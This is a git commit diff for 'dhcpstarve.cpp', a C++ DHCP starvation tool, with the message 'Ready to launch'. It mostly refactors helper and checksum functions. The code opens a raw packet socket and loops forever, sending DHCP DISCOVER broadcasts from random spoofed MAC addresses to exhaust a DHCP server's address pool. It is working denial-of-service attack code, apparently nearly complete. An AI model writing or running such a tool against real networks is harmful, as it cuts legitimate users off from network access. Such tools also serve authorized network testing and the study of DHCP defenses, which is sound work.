72d5850ef0c75fec0c20a5197db35b1a03e27f8c
Adam Sulc <adam.sulc@flowmon.com>
2018-04-09 20:14:53 +0200

    Ready to launch

--- dhcpstarve.cpp
+++ dhcpstarve.cpp
@@ -25,51 +25,6 @@ using namespace std;
 
 using Mac_addr = array<uint8_t,6>;
 
-vector<string> make_args(int argc, char* argv[]) {
-    vector<string> args;
-    for (int i {0}; i != argc; ++i) args.push_back(argv[i]);
-    return args;
-}
-
-void print_mac(const Mac_addr& octets) {
-    cout.fill('0');
-    cout << hex   << setw(2) << unsigned{octets[0]} << ':'
-                  << setw(2) << unsigned{octets[1]} << ':'
-                  << setw(2) << unsigned{octets[2]} << ':'
-                  << setw(2) << unsigned{octets[3]} << ':'
-                  << setw(2) << unsigned{octets[4]} << ':'
-                  << setw(2) << unsigned{octets[5]} << '\n';
-    cout << dec;
-}
-
-void check_args(const vector<string>& args) {
-    if (args.size() != 3) throw runtime_error{"Usage: " + args[0] + " -i interface"};
-    if (args[1] != "-i") throw runtime_error{"Invalid option used: " + args[1]};
-}
-
-int create_socket() {
-    int socket {::socket(AF_PACKET, SOCK_RAW, IPPROTO_RAW)};
-    if (socket == -1) throw system_error{errno, generic_category()};
-    return socket;
-}
-
-int get_interface_index(int socket, const ifreq& ifr) {
-    ifreq ifrcopy(ifr);
-    if (ioctl(socket, SIOCGIFINDEX, &ifrcopy) == -1) throw system_error{errno, generic_category()};
-    return ifrcopy.ifr_ifindex;
-}
-
-Mac_addr get_mac_address(int socket, const ifreq& ifr) {
-    ifreq ifrcopy(ifr);
-    if (ioctl(socket, SIOCGIFHWADDR, &ifrcopy) == -1) throw system_error{errno, generic_category()}; 
-
-    const uint8_t* mac {reinterpret_cast<uint8_t*>(&ifrcopy.ifr_hwaddr.sa_data[0])};
-
-    // ether_header eh {};
-    // copy_n(mac, 6, &eh.ether_shost[0]);
-    return {mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]};
-}
-
 struct UDP_header {
     uint16_t source_port;
     uint16_t destination_port;
@@ -114,18 +69,87 @@ struct Ethernet_frame {
     Bootstrap bootp_discover;
 } __attribute__((packed));
 
+vector<string> make_args(int argc, char* argv[]) {
+    vector<string> args;
+    for (int i {0}; i != argc; ++i) args.push_back(argv[i]);
+    return args;
+}
+
+void print_mac(const Mac_addr& octets) {
+    cout.fill('0');
+    cout << hex   << setw(2) << unsigned{octets[0]} << ':'
+                  << setw(2) << unsigned{octets[1]} << ':'
+                  << setw(2) << unsigned{octets[2]} << ':'
+                  << setw(2) << unsigned{octets[3]} << ':'
+                  << setw(2) << unsigned{octets[4]} << ':'
+                  << setw(2) << unsigned{octets[5]} << '\n';
+    cout << dec;
+}
+
+void check_args(const vector<string>& args) {
+    if (args.size() != 3) throw runtime_error{"Usage: " + args[0] + " -i interface"};
+    if (args[1] != "-i") throw runtime_error{"Invalid option used: " + args[1]};
+}
+
+int create_socket() {
+    int socket {::socket(AF_PACKET, SOCK_RAW, IPPROTO_RAW)};
+    if (socket == -1) throw system_error{errno, generic_category()};
+    return socket;
+}
+
+int get_interface_index(int socket, const ifreq& ifr) {
+    ifreq ifrcopy(ifr);
+    if (ioctl(socket, SIOCGIFINDEX, &ifrcopy) == -1) throw system_error{errno, generic_category()};
+    return ifrcopy.ifr_ifindex;
+}
+
+Mac_addr get_mac_address(int socket, const ifreq& ifr) {
+    ifreq ifrcopy(ifr);
+    if (ioctl(socket, SIOCGIFHWADDR, &ifrcopy) == -1) throw system_error{errno, generic_category()}; 
+
+    const uint8_t* mac {reinterpret_cast<uint8_t*>(&ifrcopy.ifr_hwaddr.sa_data[0])};
+
+    return {mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]};
+}
+
 uint8_t unset_broadcast_and_group_bit(uint8_t c) { return c &= ~3; }
 
-uint16_t ip_csum(uint16_t* data, int words) {
-	uint32_t sum, i;
+uint32_t partial_checksum(const uint16_t* data, size_t words_count) {
+	uint32_t sum {0};
+	for (size_t i {0}; i < words_count; ++i) sum += data[i];
+	return sum;
+}
 
-	sum = 0;
-	for (i = 0; i < words; i++)
-		sum += data[i];
+uint16_t ip_checksum(const uint16_t* data) {
+	uint32_t sum {partial_checksum(data, sizeof(ip)/2)};
 	sum += sum >> 16;
-
 	return ~sum;
 }
+
+/*
+uint16_t udp_checksum(const uint16_t* data, uint32_t srcip, uint32_t dstip, uint16_t len) {
+
+	struct {
+		uint32_t source_ip;
+		uint32_t destination_ip;
+		uint8_t zero;
+		uint8_t proto;
+		uint16_t length;
+	} pseudo_udphdr {};
+
+	pseudo_udphdr.source_ip = srcip;
+	pseudo_udphdr.destination_ip = dstip;
+	pseudo_udphdr.proto = 17;
+	pseudo_udphdr.length = htons(len);
+
+	uint32_t sum {0};
+	sum += partial_checksum((uint16_t*)&pseudo_udphdr, sizeof(pseudo_udphdr)/2);
+	sum += partial_checksum((uint16_t*)&data, len/2);
+
+	sum += sum >> 16;
+	return ~sum;
+}
+*/
 
 int main(int argc, char* argv[]) {
     vector<string> args {make_args(argc, argv)};
@@ -161,25 +185,24 @@ int main(int argc, char* argv[]) {
     iphdr.ip_ttl = 16;
     iphdr.ip_p = 17;
     iphdr.ip_sum = 0;
-	iphdr.ip_sum = ip_csum((uint16_t*)&iphdr, sizeof(ip) >> 1);
     iphdr.ip_src.s_addr = 0;
     iphdr.ip_dst.s_addr = ip_broadcast;
+    iphdr.ip_sum = ip_checksum((const uint16_t*)&iphdr);
 
     cout << "Sizeof ip: " << ntohs(iphdr.ip_len) << '\n';
-
-    auto gen = std::bind(uniform_int_distribution<uint64_t>{}, mt19937_64{static_cast<mt19937_64::result_type>(chrono::system_clock::now().time_since_epoch().count())});
-
-    UDP_header udp_hdr {};
-	udp_hdr.source_port = htons(68);
-	udp_hdr.destination_port = htons(67);
-	udp_hdr.length = htons(sizeof(UDP_header) + sizeof(Bootstrap));
-	udp_hdr.checksum = 0;
-
-    cout << "Sizeof udp: " << ntohs(udp_hdr.length) << '\n';
 
     Bootstrap bootp_discover;
     bootp_discover.bootp_flags = htons(0x8000);
     bootp_discover.transaction_id = htonl(123123123);
+
+    UDP_header udp_hdr {};
+	udp_hdr.source_port = htons(68);
+	udp_hdr.destination_port = htons(67);
+	size_t udp_len {sizeof(UDP_header) + sizeof(Bootstrap)};
+	udp_hdr.length = htons(udp_len);
+	udp_hdr.checksum = 0;
+
+    cout << "Sizeof udp: " << ntohs(udp_hdr.length) << '\n';
 
     Ethernet_frame frame {};
 	frame.destination = mac_broadcast;
@@ -196,8 +219,9 @@ int main(int argc, char* argv[]) {
     addr.sll_protocol = htons(ETH_P_IP);
     copy(mac_broadcast.cbegin(), mac_broadcast.cend(), &addr.sll_addr[0]);
 
+    auto gen = std::bind(uniform_int_distribution<uint64_t>{}, mt19937_64{static_cast<mt19937_64::result_type>(chrono::system_clock::now().time_since_epoch().count())});
+
     for (;;) {
-    //for (int i{}; i != 1000; ++i) {
         uint64_t n {gen()};
         uint8_t* c {reinterpret_cast<uint8_t*>(&n)};
         
@@ -207,6 +231,7 @@ int main(int argc, char* argv[]) {
 
         frame.source = rand_mac;
         frame.bootp_discover.client = rand_mac;
+		// frame.udphdr.checksum = udp_checksum((uint16_t*)&frame.udphdr, iphdr.ip_src.s_addr, iphdr.ip_dst.s_addr, udp_len);
 
         // print_mac(frame.source);
         // print_mac(frame.bootp_discover.client);
